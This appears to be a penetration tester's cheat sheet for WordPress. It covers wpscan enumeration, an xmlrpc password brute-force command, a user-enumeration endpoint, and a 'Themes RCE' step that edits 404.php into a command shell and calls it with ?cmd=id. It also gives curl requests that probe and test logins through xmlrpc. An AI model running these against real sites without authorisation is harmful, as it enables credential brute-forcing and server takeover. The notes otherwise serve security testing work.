# Wordpress

## wpscan
 - [wpscan](https://wpscan.com/) Get api token here

```bash
gem install wpscan
```

Enumerate
```bash
wpscan --url <root-url> --enumerate --api-token <api-token> 
```

Password bruteforce
```bash
wpscan --password-attack xmlrpc -t 20 -U admin -P passwords.txt --url <root-url>
```

## Fingerprint

- Check the version from the `<meta name="generator"` tag or from script/stylesheets's `?ver=` param.

## User enumeration

Pre 4.7.1
```
/wp-json/wp/v2/users
```

## Themes RCE
Update theme pages like 404.php to run system commands, then query them

```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

## Metasploit

```
search wp_admin
```

## xmlrpc

list methods
```
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://<host>/xmlrpc.php
```

login example
```
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<host>/xmlrpc.php
```